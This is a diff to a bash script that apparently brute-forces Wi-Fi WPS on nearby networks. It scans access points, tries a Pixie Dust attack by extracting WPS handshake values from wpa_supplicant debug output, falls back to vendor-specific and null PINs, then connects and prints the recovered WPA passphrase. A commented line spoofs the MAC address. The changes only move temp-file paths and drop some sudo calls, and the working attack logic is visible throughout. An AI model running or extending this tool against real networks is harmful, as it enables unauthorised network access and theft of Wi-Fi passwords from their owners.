@@ -7,16 +7,16 @@ RESET='\x1b[0m'
 
 [ -z "$IFACE" ] && IFACE=wlan0
 
-sudo mkdir -p /tmp/wps_brute 2> /dev/null && sudo chmod o+rw /tmp/wps_brute
+mkdir -p ./tmp/wps_brute 2> /dev/null && chmod o+rw ./tmp/wps_brute
 
 function pixiedust(){
   TIMEOUT=10
   shopt -s lastpipe
   echo -ne $GREY' try pixiedust         \r'$RESET
-  echo -e 'ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1' | sudo tee /tmp/wps_brute/wpa_supplicant.conf > /dev/null
+  echo -e 'ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1' | sudo tee ./tmp/wps_brute/wpa_supplicant.conf > /dev/null
   { sleep 1; sudo /opt/wpa_supplicant/wpa_cli wps_reg "$1" "12345678" > /dev/null; } &
   EnrolleeNonce=''; DHownPublicKey=''; DHpeerPublicKey=''; AuthKey=''; EHash1=''; EHash2='';
-  sudo timeout $TIMEOUT /opt/wpa_supplicant/wpa_supplicant -i $IFACE -d -K -c /tmp/wps_brute/wpa_supplicant.conf | grep --line-buffered -e 'E-Hash' -e 'AuthKey' -e 'Enrollee Nonce' -e 'DH own Public Key' -e 'DH peer Public Key' | while read line
+  sudo timeout $TIMEOUT /opt/wpa_supplicant/wpa_supplicant -i $IFACE -d -K -c ./tmp/wps_brute/wpa_supplicant.conf | grep --line-buffered -e 'E-Hash' -e 'AuthKey' -e 'Enrollee Nonce' -e 'DH own Public Key' -e 'DH peer Public Key' | while read line
   do #echo "$line"
     if echo "$line" | grep -q 'Enrollee Nonce'; then
       read a b c d e hex <<< $(echo "$line")
@@ -61,16 +61,16 @@ function nullpin(){
 }
 function connect(){
   TIMEOUT=10
-  echo -e 'ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1' | sudo tee /tmp/wps_brute/wpa_supplicant.conf > /dev/null
+  echo -e 'ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1' | sudo tee ./tmp/wps_brute/wpa_supplicant.conf > /dev/null
   { sleep 1; sudo /opt/wpa_supplicant/wpa_cli wps_reg "$1" "$2" > /dev/null; } &
-  sudo timeout $TIMEOUT /opt/wpa_supplicant/wpa_supplicant -i $IFACE -c /tmp/wps_brute/wpa_supplicant.conf | while read line
+  sudo timeout $TIMEOUT /opt/wpa_supplicant/wpa_supplicant -i $IFACE -c ./tmp/wps_brute/wpa_supplicant.conf | while read line
   do
     if echo "$line" | grep -q 'CTRL-EVENT-DISCONNECTED'; then
       break
     fi
   done
   #cat /tmp/wps_brute/wpa_supplicant.conf >&2
-  sudo cat /tmp/wps_brute/wpa_supplicant.conf | grep 'psk=' | awk '{print $1}' | while read password
+  cat ./tmp/wps_brute/wpa_supplicant.conf | grep 'psk=' | awk '{print $1}' | while read password
   do
     echo -e $GREEN"[+] ${password:5:-1}       "$RESET
     return 0
@@ -100,15 +100,15 @@ do
   for ((i=0; i<${#bssids[@]}; i++))
   do
     echo -e "${essids[i]}"$'\t'"${bssids[i]}"$'\t'"${signals[i]}"
-  done | sort -n -k 3 -r | uniq | sudo tee /tmp/wps_brute/wpa_net.txt >> /dev/null
+  done | sort -n -k 3 -r | uniq > ./tmp/wps_brute/wpa_net.txt
 
   IFS=$'\x0a'
-  for net in $(sudo cat /tmp/wps_brute/wpa_net.txt)
+  for net in $(cat ./tmp/wps_brute/wpa_net.txt)
   do
     IFS=$'\t' read -r essid bssid signal <<< $(echo "$net")
-    sudo fgrep -q "$essid" /tmp/wps_brute/essids_known.txt 1> /dev/null 2> /dev/null && continue
+    fgrep -q "$essid" ./tmp/wps_brute/essids_known.txt 1> /dev/null 2> /dev/null && continue
     echo -e "[*] $essid $bssid $signal"
-    echo -e "$essid" | sudo tee /tmp/wps_brute/essids_known.txt >> /dev/null
+    echo -e "$essid" >> ./tmp/wps_brute/essids_known.txt
     IFS=' '
     #sudo ifconfig $IFACE down; sudo ifconfig $IFACE hw ether "00:$[RANDOM%110+10]:$[RANDOM%110+10]:$[RANDOM%110+10]:$[RANDOM%110+10]:$[RANDOM%110+10]" 2> /dev/null; sudo ifconfig $IFACE up
     pixiedust $bssid || vendor_specific $bssid || nullpin $bssid
